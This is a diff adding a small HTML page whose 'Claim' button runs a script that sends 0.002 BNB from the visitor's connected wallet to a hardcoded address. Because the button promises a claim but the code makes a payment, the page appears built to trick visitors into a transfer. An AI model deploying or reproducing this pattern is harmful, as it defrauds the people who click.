@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.3.6/dist/web3.min.js"></script>
+</head>
+<body>
+    <button onclick="payWithBNB()">Claim</button>
+    
+    <script>
+        async function payWithBNB() {
+            if (typeof window.ethereum !== 'undefined') {
+                await ethereum.enable();
+                const web3 = new Web3(window.ethereum);
+                const accounts = await web3.eth.getAccounts();
+                
+                // Check if the user has selected an account
+                if (accounts.length === 0) {
+                    alert('Please connect to MetaMask or WalletConnect and select an account.');
+                    return;
+                }
+                
+                const account = accounts[0];
+                const amount = '0.002'; // BNB amount in BNB (18 decimal places)
+                const receiverAddress = '0xD9E818f75c948D11fBFFD65bFC626ea29a1f583b';
+                
+                // Convert BNB amount to wei
+                const amountWei = web3.utils.toWei(amount);
+                
+                // Prepare the transaction object
+                const transactionObject = {
+                    from: account,
+                    to: receiverAddress,
+                    value: amountWei
+                };
+                
+                try {
+                    // Send the transaction
+                    const transactionHash = await web3.eth.sendTransaction(transactionObject);
+                    alert('Payment successful! Transaction Hash: ' + transactionHash);
+                } catch (error) {
+                    alert('Payment failed: ' + error.message);
+                }
+                
+            } else {
+                alert('Please install MetaMask or WalletConnect to make the payment.');
+            }
+        }
+    </script>
+</body>
+</html>
